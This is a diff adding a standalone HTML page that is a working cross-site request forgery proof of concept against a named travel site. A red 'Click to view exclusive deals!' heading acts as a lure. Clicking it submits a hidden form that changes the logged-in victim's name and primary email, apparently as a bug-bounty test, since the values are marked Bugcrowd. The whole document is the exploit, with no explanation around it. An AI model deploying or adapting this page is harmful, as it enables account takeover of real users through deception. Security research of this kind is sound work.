@@ -1,0 +1,26 @@
+<html>
+<body>
+  <!-- Visible trigger for user interaction -->
+  <h1 style="color: red; cursor: pointer">Click to view exclusive deals!</h1>
+
+  <!-- Form will auto-submit after click -->
+  <form id="csrfForm" 
+        action="https://www.tripadvisor.com/ModuleAjax" 
+        method="POST"
+        enctype="application/x-www-form-urlencoded"
+        style="display: none">
+        
+    <input type="hidden" name="actions" value='[{"params":{"firstname":"ziadbugcrowd","lastname":"test","primaryEmail":"ziad686@bugcrowdninja.com"},"name":"SAVE","resource":"modules.common.entity.LoggedInMember"}]'>
+    <input type="hidden" name="context" value='{"modules.membercenter.model.ContributionCounts":[{"memberId":"FOY3v6GnNeOB/lMD3V9UCA=="}]}'>
+    <input type="hidden" name="authenticator" value="Random">
+    <input type="hidden" name="version" value="5">
+  </form>
+
+  <script>
+    document.querySelector('h1').addEventListener('click', () => {
+      // No cookie access needed - rely on SameSite=Lax behavior
+      document.getElementById('csrfForm').submit();
+    });
+  </script>
+</body>
+</html>
